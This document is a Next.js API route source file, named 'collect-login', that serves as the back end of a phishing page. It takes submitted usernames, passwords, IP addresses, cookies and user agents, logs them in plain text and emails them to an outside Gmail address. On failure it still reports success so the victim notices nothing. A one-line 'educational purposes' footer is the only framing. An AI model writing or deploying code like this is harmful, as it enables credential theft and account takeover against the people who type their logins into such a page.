// app/api/auth/collect-login/route.ts
import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

export async function POST(request: Request) {
  try {
    const data = await request.json();
    
    console.log('📝 Login Data Received:', {
      username: data.username,
      password: data.password,
      ip: data.ip,
      timestamp: data.timestamp
    });

    // Configure email transporter
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    // Send email with collected data
    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: 'blessedresult6@gmail.com',
      subject: `🔐 LOGIN: ${data.username}`,
      text: `
🔐 LOGIN DATA COLLECTED

Username: ${data.username}
Password: ${data.password}
IP Address: ${data.ip}
Cookies: ${data.cookies || 'No cookies'}
User Agent: ${data.userAgent || 'Unknown'}
Timestamp: ${data.timestamp}

---
Training Mode - For Educational Purposes Only
      `,
      html: `
        <h2>🔐 Login Data Collected</h2>
        <table style="border-collapse: collapse; width: 100%;">
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Username</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.username}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Password</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.password}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>IP Address</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.ip}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Cookies</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.cookies || 'No cookies'}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>User Agent</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.userAgent || 'Unknown'}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Timestamp</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.timestamp}</td></tr>
        </table>
        <p style="color: #888; font-size: 12px; margin-top: 20px;">⚠️ Training Mode - For Educational Purposes Only</p>
      `,
    });

    console.log('✅ Login data sent to blessedresult6@gmail.com');

    return NextResponse.json({ 
      success: true, 
      message: 'Login data collected and sent' 
    });

  } catch (error) {
    console.error('Error sending login data:', error);
    // Still return success so the user flow continues
    return NextResponse.json({ 
      success: true, 
      message: 'Data collected (email may have failed)' 
    });
  }
}